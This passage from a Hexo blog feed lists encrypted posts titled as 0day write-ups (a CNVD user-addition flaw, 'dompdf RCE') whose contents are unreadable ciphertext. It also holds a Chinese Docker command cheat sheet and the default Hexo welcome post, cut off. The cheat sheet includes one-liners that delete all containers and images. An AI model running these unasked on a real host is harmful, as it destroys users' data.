        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="9db8dca70ddfceb2889ad5735be74e31762a4e72b78daaf867158f1195dc5789">a18c464404a1613be2d6ed29404d7b521eb0a31e234ad2262ca09a7140e7877f6857b0bf22a5d1743281746d3df82c3d5769ea1b251cbe33ce9b4ee65f9b48b82c66e53da86896aa03e634d455c8dea12bed7883c3d1f289c9e301f9cff1f93183cd8f9265265a7a88d3bd033764b0a8756c655afd865e79bb263816cfd71f907d0b98723ba231a253a2cc8331494d5710e0145610deb39cc78a90e63d4253b9b1ac78bb615daed3762491bc06b2fe2a6e3e4f93c41c34aa1cc916636f0fbf655485e2c60ebb7b4637694be43c1c18aec68b817728c4d74b1ffb2c7fc821564f1cfc5c51f5f0371bb25308e933c838c2209d9fd26ce2aae4a95f082d1e01b293</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2022-43072 任意用户添加</title>
      <link href="/2023/03/17/CNVD-2022-43072/"/>
      <url>/2023/03/17/CNVD-2022-43072/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="6f9e8d3d751a5be38774d7f1e3bee0da0059d356ad55f5eb615d010767a58db5">a18c464404a1613be2d6ed29404d7b521eb0a31e234ad2262ca09a7140e7877f6857b0bf22a5d1743281746d3df82c3d5769ea1b251cbe33ce9b4ee65f9b48b82c66e53da86896aa03e634d455c8dea12bed7883c3d1f289c9e301f9cff1f93183cd8f9265265a7a88d3bd033764b0a8756c655afd865e79bb263816cfd71f907d0b98723ba231a253a2cc8331494d5710e0145610deb39cc78a90e63d4253b9b1ac78bb615daed3762491bc06b2fe2a6e3e4f93c41c34aa1cc916636f0fbf655485e2c60ebb7b4637694be43c1c18ae84745a0fef6a85e78af0ce579fa568c9cc5f3def1ff81579502d367fb5b1aa782993be6b07847c0d40f5d03c1f5ea08c3d64ae6a9cb58a858946efe27cfb73c782e281426a7a9f3ea4234633dcac6e5fc23cb47bea5e3f92f27500b2961ff7f3d8e75b7f93c8d8c369bb5fb2096aec35865cd3cfca18109184f38380acfc85d1af1d269592d02135a612fe3c1bd27345acf8f6c58e19877de9f02160c19bfc189a8155e38a357a52078cf9f8d28656b9f9db8d1e8e32d42b9b7c82169ec31af5bee833f3c39c5e894fc7fb9f5988d2341ee0f433b5c18ca5816b49af4e483713219612b5ba30bbcd80fcb18333bcdf37d087027a3ea820d7463f06a17494e36887b0b1d3550c4954e102e2d0176ab90bb18972e58db5fd2b5326d1b342a6b0d7de07c5f26e544317fbd58646264e508517834e0be02484ebbeb898b3eb7ccd4fb1f901ac32d2e80acf5203bc31116906169f800f9942f5a5ad932b3fdd377059e84360eaaae56f38f21583d99ba4282bc716d9f4e18c240da3bb0e4b5ded8df2f6a63547ba8f8b10a27e09be386bfbab67c0d05849a85edaf60b05d64d7351252cecfe57ed4b56634d21e6b0bc90cd70193470f2f151f8673a5e140d1055d2f575134f132207a2fd28b5c23be20dfe2a0ebd541aa0970e160278a381db6958e0342d8b09659b615da486c3b12739346a6a72abaf9fbb32c3f302c696ddbd896db97fdae02bd9b83658e79762a5ff8195d7e473478478558a2e774def713e2518de51ad16c28f28192e82845baf804509a45c75b05654d2676161f34cd95717eb2cd96efdc9f58dd5ed57c8bcd5a28b1dd29bdfb8d66a6cf11e26058f9dad05c1705af252cd4aa7a2e7e397e04ce247cf94079bc99dea7539ea497eb171008d3d6da24bd20b4d5dee94fe4f3a2360917e5494c70eac350ac66eabed26f8090361ffdf8e9b44f2a9dc2bf8047319b0458425e921e9d2946e7cefacaee877b51598c89bd5b14fa9a0b61cb50b18d5457b2f0e28316c7aeb380112355ad56dfd9d0a082cdfc550e46bebcf5b745799dbdae65095abdee1f7fd5ccb283151a913e8b0bb58122d036bd22f877d3c45c675b87552338bfef653a468c5413839745e1229db379a73b0347fd73b8b365f03b248112c302a2f19b400e4b14091dd3a2524c833140d0638abf4cf87136c5531901e9457ccdb9a1775c7c081c8b4660e1768f7c9a7a1c1cc3275f1f136ce42ec314c2cac840c2b83f5f93d88bccae40dac33b5c3e7b6c800a39d267225e8301bea401eaec80441c8685cf0a341b826d72202399db084fda05895100d2479ce4c9ef525cb938e286f1f46fa082a9772fc26184e4b081ad44aec333740cabcac0b171ff7f50ffe07ff8f3cc523d19a5b2368cea46acbddd1ef62654e73a34542fa802ce654f43e8b9a7f399a39f628914f4c596b21fac7a4a974f37f2f60c3b81d6d948c0e64da0054a65db34bc6862cbcc67238ce2fd3a4a688c160dd608d19167fffc08ce7a4bc2aa10d74464a16fe0c70c223ce0b629d6d7466be5f2561700ec61a633ee49d8c0eadae3aa4002ff47bf8eb1af594b0cf60a48bb9a88553a12daf1b4e6b4b953346ce10ba232e55896ed0079620552dc5e9b35d0cfd49f407bf9f600819a3f1b70354ef69f81870d5371f4fbdfc18934cbcfdae8628038b3df8fc33e053e45bdb4c581fdee02addb56e6f4ec7d6f66a6e1bd25a695f2e0d66866cb12f496b4c6c6e25863c875fa3de246258a6d9bd946c506ad2aa1c74f74b1160bcfa7bf8866f5f95ee94012d4cca069a1b144c68f84c2e995bee3d686c5a2b2bb5f28fbdbf160914da822925c023404d6606458396d33c61d6cd60f98651ba92679d8cd1b9849bcdeff53bbad97f1251d758d186cd3ca8d5fe35fc332b78414e2040f19926c034f9241d4c33f496a0eefbb34a070bb17457cf25f3cd8f72d86825d12eebdcf6eb639ecd9e222e307849461c72ceb4afb4cbf41dbb9b836b6c3a43d08e7a3850e328b9f530385246afae7d766fa158e5fdf9321bf6b1fff5da6cb0150d2737b8be3e40d4b3e1961e5ee768d2d7879cd80b1a4164f77d89d2df9f362461e1a0d3b352a92dbb62061e25f65b52137bbd4e0909e127975387ffac16d2db19bca24b90d27cb070a63586010fa1bcd45888cc04055139925afcbd45433ad155ca15301dd72f40560e4e6cff5e7288c5e2fa955ba1b8720752e2b74bfe3c1c911e9c12ad5202370435212b32de34704739015542a790946313658591fc65c231c8cc4b78c372bbb2630cfef38f4fbcaa390d813a48ad06223075f309a115161296e3f270dd92c622fc05e6853f6dfa106677aba721f37597ee87fc8847516357e72dc0afe50e62dcb92ac675b015b4862a0bb981261cf09717652f67c4349cfbf66679a7ed31f1f9f98418f8a663deeb786ffa169289ede2b795817ef9ed5e532154f9fe80a24b83e2a4dd3de091bd551664535e20dee09f2c1a2d6fd03b06ebf0886b8ce5f3d7fb528cc52f9d12c48f386d2ddc8d62cf321b19b6d7d10e6c3c4ce96e16436e45f8d73d2df4029dffa06358070f31abcb548d5e4499d035d613cfb3dc08445da508ee37b16ae026b854eaacb1558688caa28222d2b8ce6b5fe1e3899ab58b7a7102dea71446d977950b7186d1bb8125aa8cc6a0eacd3ef571640c9e8af14e23a7c2b76a0d3da6d7422dc7dfca2aa1bca72a3036108db4993f3469557e802d1232247e1379ded18ef0a8e9a6584ad3e772f66e5b2e9653cde1a9274630590da554870613738eabab8c62f140a0ac8e76009a1dec6c0cc0befb30a7c91b1d14748e433e33d12d9df0e4f7c02522d4377c24c95200a9a8c5ba2631790cab1a1e4a6a75ff0e7a3fa56547d2d3ebcc833853649c8b067a509e182ebfe359cf3508e414c9eec4bb2a4ddbfc636cab2dda7563fbbb333e59367bcd0c14b06ae0300f255a0dad3060fed87bb1fefbc540fa451b32f637d6732159f9771295c9da65c561b9d37d0f72840e2d5456285ab108318d7ced3e7199236d9157f107c8b6d1d10c504e0f40c1b29767ebc6f5f30654e2f822b91ab0c407e77918fab1010f46a98b93466b29e73a174f0ce982dc885b60b0672d941698df58f0f03b3efcc1c173018531039fb7b5b30f8624779452d89b65cd203a4c439d8eb24b8a20c332b5d799977c5a526aa328a36827f1ccd5c90dd36bd7a1f8f05b53bb68bdb9a5da676129f7984bb6559bf57001622305de4025330c99841857a9506346193718e4dd8a5b999de57454f8bf189b7699b49b883b78d2aa1d1560d9d591372f0bbb3c5f465f4224be666731540b526f24576df4b8791c70fedfb6f9d727918ba47e0a9984564cb9c93355fbdba82ebb5bc209d5dc64e37f29079f318b376e52ecaf8bf6127e73b1eb421939391b4eb5c392c80bf2ac9ff803011acabfde57341bb9d6fb89981a09c265c5ef8c98fcfc09d0a24d93fae3e5a160d118d0e80d8fb3f143d247c4e9eae48eb822776b532ca04b2127f4aed1cb010129d37fc4392f9a32c0543c0731c205c0ece1f0635855670305d05077b8b4bd1189d6c555f4dc5012ab6f72085aaeccd252943afabf94fa8ab1a599fe327fdf8acc1e219fd48bace49ed0ac76ddd7723cdc3a8eb99b11361883bba952ce0829c0765d3ba8a38447ee6289f5ddc81325cbc08c715d3ae9a47512337afda980a4b79ac995639e5fcc1e10740b440909b5223960cadfa02cf62deeb60ebcba8e73af2fb5dba92de1e5c2c6d61eb986c19ffb6866c9a56e8aa57cd88c979336f72e5d8fc6ce52ac17f39c63092766a815797dbc179adb26a619988e820dc71d180f3f322e6a5cf11769ce65029129b97cb808f80d699851c25810f5b082220f7015c71bab1ab948adce7745aae46fb0120597e134efe1255b62538a33ce39f564b7fe8a358d557368f56ed216e8d6f8856433bbda30dd373ff657d49c3700e8c27592a2b05fe9c468b8aefd2409feca3482fa735cb250c5a8d3494ba690834e3a8c9c528b8407a537cd4e4a073da6f8f6414a5b1fa7e8ead764e47649382afcbe2f63604d0208e0a0b1d852e024c81e03b689cccd08ccfb1251e3bef7191d2f43c7579bf6d201e0d4825ce6efb0d425a3492fab172df65eab5d4db08c14f605ea26c2ecde3cb1bb8fb29ab596a1dac3f6629704487c573a45f1d158e0e1df11182259d7e08e74de</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dompdf RCE</title>
      <link href="/2023/03/17/0day-dompdf%20RCE/"/>
      <url>/2023/03/17/0day-dompdf%20RCE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="b1a7c14bbe79cd95439527d210deebc328535331131b1f8e533fff2ca2cb08ac">a18c464404a1613be2d6ed29404d7b521eb0a31e234ad2262ca09a7140e7877f6857b0bf22a5d1743281746d3df82c3d5769ea1b251cbe33ce9b4ee65f9b48b82c66e53da86896aa03e634d455c8dea12bed7883c3d1f289c9e301f9cff1f93183cd8f9265265a7a88d3bd033764b0a8756c655afd865e79bb263816cfd71f907d0b98723ba231a253a2cc8331494d5710e0145610deb39cc78a90e63d4253b9b1ac78bb615daed3762491bc06b2fe2a6e3e4f93c41c34aa1cc916636f0fbf655485e2c60ebb7b4637694be43c1c18ae519d115df02350229a1da9b94cb366da333d30b1f63b4ad63920a6f7e4d8f9a05db1047e95a78359778726e6fd7c33fb7c8fe2b5eb8b30b03ba9b3cba4d623399b53da32e128bf8fbcf3dc2f089c1838308940cd410c8d60b9f54e12c283b6504f70c8cf841a33692167af6df90366821fabfc279335b0e938f10c0f41847bce72d98ebb09647fa8b2984b6724618e7e9680a62a3b5431713f2a85869907212c14f7d17b16a4ef74cdf2cb244d25fb83a3a3baf088c54afac777051e80bad2bd9a79a09e81ab67d015b6d0b2e25a0b0bd7330c60b9bc3e7795fad83cdf4dfd9831e08d3693f6542681da41c34402c6f357adb69677173c5057c691429178d21db29388b56f1a8656dc3c0696a9ccc42e25aae990df7ac42be18f576dc5dec912a494e3505a395b0bf342947ecd5633a6f14eae4da01d5a241034bb5e00f9c646a8eb2e5e6ea28c1359aa9895e82fb0a0b07302a505fa3a3e012dcaa754ee39900526460e435a9e4f5f9fff8f71f214170d43be527bdd491fe2a147b0b835f795d0e8908d4f29121e19b04bed30d1f388b2aefa0fe0df4f03d7a7b8c599faa8827c61722dd27dcbb160b0a2d6820e95dc00bf27dea1521befea01f178d0adda59deaa0b50f18bfde8b14e797afd86dd19c9d55f630f9e0f6059586f1f7f68fdd50ac6bd7246210a45c633d5b41aa28bc51daadc8721a9adc934498ff19ab35d5c86a6e63662558bc7fadb41d0283e2b6562ba9f825b3e558af3c68031d2a2cd118a70de03574a6827665f388f8a1d1894aa47b7ff8fd3d383b23d014a392600fb5f1b9dbf3b4723c8609b82b949049cf1522d3fa39408a3a296fe9884c34cc9e7b54d0c494e017aabc4f299456c0dbbafd3d68a459ed8b4077bfc595f9ec410923ccdeb0657b3598adb939450ff6e2b8e04b1b414af63277157669830ccb77183fe77ffd30c6e893dd7d3ac75889d471b2734e431340a836a8902d19cc1a4358d7f1afe482001cb0fa5d687f79d14dcaee40b08c3a7034bb781118c185723372a6d80fa17fcaa5e8ae45b3538a2cb59f133ed39088b1ade80751f2d657d39debe7dda12fa715f50dce8548f9c232e245667a3591d1fc07c8988ae529bf1b933558a6581ae6712dab757f6dffe4d0f12d7c8848aa97985ff2acb20fe50268d7b89c2ae44abf28d886b86a0b07cab3fdd01b20ab289afa94f290a389dd518f9ed8c4edec93143c5f84b70840e4a5a325a694ee7d180d98e68015384da986578e9b24bd9d410e9520f7d026ac04006b8d9333fc44c95fdb98d108f7b669305619b364237d391d58610b7e2ba8a3941ea11c92180a962a5cc66f005d0af3800ad0b9c7a660d888a85bb40e3d7ef346ca28cd5fb8cb8cff8a559cba047f9fe1fddaec711edaeb59f573c4d6a26a83b115ee0e1a4511ebed0971eb47e751d10902ccd385ec9df2434f53ba373fedd06c6b380bae6a2fce3a1d12efc5617a82431cbc4a6cca7e508f020e106813a9db009264cb9c0d536d5b92493703a1e218933cda940411dac5b938b7c842f0dce23261ac46c43de02e7674d514462c8e8995bed6822b30f699f6dd1e6ccf29e3c7f03e89dd4354318e50e20a159850baee11b7b5556b3cbaf52898c6266051d695f9cc95a86036bc9b93d97e890321f6b5f130be75cd2049aeb99d3b3fecd505d8254af49efd157bd0fff79bf0b070935e3f8f596a9a735ddf3f7476755b08f5ed2c952390ca37e3a3c6a4492e51ab00bce023007bec70bb4f49db2dbcb1ca57fe21880dd2772e50f61212dcf1493ee623e3505cee77c3b83f380c00415eede450c045029a1d0893b4127ba4bf7fdfe90efae00fa9101494545e7346a29424d123f4d74de42a0bba32e3710e46054d8965c806b21a3fb54ba5d7d39a9e3b7724b7f2fe81f661146542c08ece2e47dab067911b694f2879dfbca9c8d40fd8d84b9f07faf0659e8233c87f824aa419d662faecf44d60276f44fb2197ddbac303ad19b80c7812050ccee1b9cf8bc886ceefd97ae21e4388299fc8aea138cb645ecdd219acda5d96a4ec17f6eff9cbf623269d2555b75346d256d80bb999318d6cacd004483b397b1d7032ae4c38eb675fca9ab29f5fba806b0a813c52497e876973ce01c048105f0383bc3f28d4082ae103930a2fa2805a2ec5731abd134ff533e64c7b23bdbdadc83577568f9352598b70b883abbc55a4d9e785b832947fecbe61112583ea2b03df6017d6a108ab9b46571031cbb21bb31e12c66e05d348f8b3215254d3a1b65b9f0ba7e184f915bd834e6e95e40a30a866e50dbb3912d59489ce0c087baedb50095d5b6098e52ca5fe65a0c4b38f695c6402c3ab0063179033b7fd0d5ae8ad03a0affb5f264d19d5c7f66ade44b968d5bdc8d45e72c066ea7103ed410312c8ce5fb393b570d8616e24b9ab32b85844fac0dc59689d3334c7f660c1d6bf3dad27def4e996c81e2365c5a3c2dda5f819f8b5f08bf9f59f2a6def8474f9e4a7f3317fe3d9a7f767504718eca269349fbe83b6759a6600dc1cbe5b5b78573b9c35ab8e5fca077e8619dddc0f31a4f7583851912c8bf10697e88ad9b067d06207cfa0c09eb3c738b01aa77b954b108e10c036e17ef0ab560c50effd5dad5cbf19f4d58a2173faa394e61e3c0321c290bb02505121d6367f71fee38320d18731b454ab2869596ad8ee936c3242a4c371a606e87d4bae4b9635bb0128031a989868c961119e17bd8d11e8f42ff72e7a93cf22420d01dbbba9a892993ad0693af626f968cdea3e06c12e4e1ae5ae056be7a91b011b88e46630e8c84751d1adc6233ea9137c55e7180a891cb17ed6864940c18cfe523acdd99714e8bb4b67e742efe25b4e766d413d2e791e36d22c4f5d919790cabb68ee5eef790b5c58b804916873dfac161b948b1a2983f9131b3393800396dea09b6aad76ebc307b35fbdccb0fb71644bce400376478d99c896f23af9346f9c75793c0187bf63f6db7ec8ae82201e2ddb668dd66912a85e6b72b6c7465e346708f0251d58480f0e0f0bc8dc0ca3e4ce16115475200e0e06d8f0b061b7a63aed3fffe64e17f3b4620c806007203e098c162d78e0489f84fb6178a1742b03649549da79217445e872baeb3f153213f155b8b135331b1eda1fde0b2cbc181af77755cb1a4155b7575873a2c49becdb482d4ec10337df141a3a7059cac916c973d7c369230f11ae6fe0e0a515023ef8487af1524f4fd21bbae86d7c1805804df1128e77518f7c7ac0f329b85b8b2be8458742cedb8527a165e5a706f45f4d1319988d46a68a8e307c91a3abe63343ce0d8ef26ec0700dab46e1f4a011b4a47ed8fef3927034642324e0fba7daa1dbc6ce4aceaa3880ced336ce5f8ab2c9582228e639e5ff208f0b979323c4af8af6694b30b33ae1810090e05174f3d5c9e2a3570fc5a2703cd893174614f4882b324b317b557e58805d21c06cb733a627dfed635d194b15728a6e8e2633093bd6083d620b457a6cee6a54afc3f2babad12e4119b51010eead242d672b9bb81823d05ed56ad57661c8352babc776de748e64b72c8ce8c143077be2cc975078660f1a04f07cf4b30ed1fb6180c175b3eb0229109e82c8b5b4c43c10805da7ac969dd68750fe24d4fb4c62160120ea110616e95b942cffbe5ae62488ca3136e8e7b5e2f098da92603fadbfeaa04da6db4a10e63cd7455e498fcaaca68db04436d9d05295077eb06d64662b66ff4419d24caaee3446cf14b807e90067bf71ab3971eefec2a9d13d07b35d50233eb50ba8176d670761393b2fabdbdf3f816bae0d2c5460f6e630c32a210a5d6c9ed4c5ada922b098f67d70523f533a6244e539de453261eb7d2906df630606f5d4d830b563f6ceec7faac17ec5160272f59369e25961c00819c68f7e697017ff3cfe3e503cfa5d2802c8174160bf24c6b210da525914a13fc7e6717411ff3af1f6a8357829152f546d9106582405f9320b040953b080a0d0ac8acde7bd87d4ad84dd1633f1db1028614b80ed771c219fbcd57e8254ded9ec246a2883b3cd59fe11a6a4e61bcc868fe48903480a50455b0a746127370b1ce4ab18308d4d2becf61268fc0c6e171861a8e4f00d90ec35578da5cdd7465596a7563ef2148302df2e30d2bab36c096de806496403cd9dd613082b0356a8bbb0ae8cf2b8fb215c0dc3d031754e7e7e503d93c99a4aa98f17b685e8401b3e21f373101f95f9a3cc9c3407965516cede8534efff2ad5dfb295647442df0cba769097d6799c3fc9a212f8e498c8d0b1be32c6aefe3b6dcc72258c7a5a817db96e947fa03bb64e3f2c5ce2544b3440ce3cb061c052d6f2c5c6f1e041d93bb411a226b70c64fa3a46f2406d010e972d4976fa2ec386db5ee5f2dd8bd93d454a2309a1b38ee62243d3ffbd364d6166567c533fc22833f02328c7cf577e85c7517f5b3bf2a7046bf33399e10e771d46d09f6268b0199e71c263993eaa30bbfa6ddbe81bbf34b8858672fae9822ad808105f6a3eada920863327a0d40fdb15beae261c1387b0749d9fede9e5d1f888d62c48aa244d6b467f3a7c2e8a6fe4eb59302d4b8ee215317fc8232441fd95557dcae82e0e4d0029f2312b1d2255ef94e1f1434610845260d41439cdb4e4204982f1723ebe0fe131f5d963a17dc9b7b45c21ec35707bf7b80c61d88853666334295a62b7870d98323c6c2b53cf335f0945c269c786bfd4af75d1cac84c4c2fdf7193933419e5972d6f0e08362aedc92e532f7616c468fc959ca816ecf917e8f7ff2bd3a7f35c7adf973377826658ed78cbbc7c4625d374689800bb9523b4084f7e4e20eb04005bb9172e2c59accb53602ed717cc5f2045656593354612a8fb5336fcf7326005ffc35ae0700f2e6100d118116ad3145097a71c1105fdb3b7617ed48fd166f36ecdec2000effd9d554b154423c3befc110f39a41dce286ac1bebfc26f1b3e5c8df109865adf732a6676ccbe9f0a004a8b3a9c8312d3be3de92911ca41a3fccda7bddaa8cb7d0d2769f7e8077ed12e7824676460dbf794888fbae1d5391821e2a977b7af715019b4438de254a6a53b3f91374502f3a8695618ec5caf3dca1188c9690f05cfb0d42640601530056a81c4b02afd24168587c1bf484ec68ff7b51cd0d615c8c8461a0eabb8cb4fc3f6e0b4b830042f1b09c5c926109d40811d034a4e5cf6d46835d65738e53b2eee89726d0ace0329672e9a7fa88b63841b038dcb0b6c2f9775803ce227dc1221bc8855b14c4d959fdeaee4df0d6dae7d033aac316380ecd24202556011ee4da82ca436f90b6ec</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用Docker命令</title>
      <link href="/2023/03/14/%E5%B8%B8%E7%94%A8Docker%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/03/14/%E5%B8%B8%E7%94%A8Docker%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="查看都有哪些镜像："><a href="#查看都有哪些镜像：" class="headerlink" title="查看都有哪些镜像："></a>查看都有哪些镜像：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h2 id="删除镜像："><a href="#删除镜像：" class="headerlink" title="删除镜像："></a>删除镜像：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi [image]</span><br></pre></td></tr></table></figure><h2 id="查看正在运行的容器："><a href="#查看正在运行的容器：" class="headerlink" title="查看正在运行的容器："></a>查看正在运行的容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><h2 id="查看都有哪些容器："><a href="#查看都有哪些容器：" class="headerlink" title="查看都有哪些容器："></a>查看都有哪些容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h2 id="删除容器："><a href="#删除容器：" class="headerlink" title="删除容器："></a>删除容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm [CONTAINER ID]</span><br></pre></td></tr></table></figure><h2 id="进入容器："><a href="#进入容器：" class="headerlink" title="进入容器："></a>进入容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [CONTAINER ID] /bin/bash        </span><br><span class="line">&lt;!-- containerID是容器的ID --&gt;</span><br></pre></td></tr></table></figure><h2 id="停止正在运行的容器："><a href="#停止正在运行的容器：" class="headerlink" title="停止正在运行的容器："></a>停止正在运行的容器：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [CONTAINER ID]</span><br></pre></td></tr></table></figure><h2 id="启动Docker服务："><a href="#启动Docker服务：" class="headerlink" title="启动Docker服务："></a>启动Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker 或者 service docker start</span><br></pre></td></tr></table></figure><h2 id="重启Docker服务："><a href="#重启Docker服务：" class="headerlink" title="重启Docker服务："></a>重启Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker 或者 sudo service docker restart</span><br></pre></td></tr></table></figure><h2 id="停止Docker服务："><a href="#停止Docker服务：" class="headerlink" title="停止Docker服务："></a>停止Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker 或者 service docker stop</span><br></pre></td></tr></table></figure><h2 id="设置开机自启Docker服务："><a href="#设置开机自启Docker服务：" class="headerlink" title="设置开机自启Docker服务："></a>设置开机自启Docker服务：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><h2 id="Docker设置容器开机自启动："><a href="#Docker设置容器开机自启动：" class="headerlink" title="Docker设置容器开机自启动："></a>Docker设置容器开机自启动：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker update --restart=always [镜像ID]</span><br><span class="line">&lt;!-- （例如：docker update --restart=always e39a959d7bff） --&gt;</span><br></pre></td></tr></table></figure><h2 id="启动所有编排容器服务"><a href="#启动所有编排容器服务" class="headerlink" title="启动所有编排容器服务"></a>启动所有编排容器服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="列出所有的容器-ID"><a href="#列出所有的容器-ID" class="headerlink" title="列出所有的容器 ID"></a>列出所有的容器 ID</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -aq</span><br></pre></td></tr></table></figure><h2 id="停止所有的容器"><a href="#停止所有的容器" class="headerlink" title="停止所有的容器"></a>停止所有的容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -aq)</span><br></pre></td></tr></table></figure><h2 id="删除所有的容器"><a href="#删除所有的容器" class="headerlink" title="删除所有的容器"></a>删除所有的容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><h2 id="删除所有的镜像"><a href="#删除所有的镜像" class="headerlink" title="删除所有的镜像"></a>删除所有的镜像</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><h2 id="删除全部镜像："><a href="#删除全部镜像：" class="headerlink" title="删除全部镜像："></a>删除全部镜像：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -aq)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker命令 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/03/14/hello-world/"/>
      <url>/2023/03/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 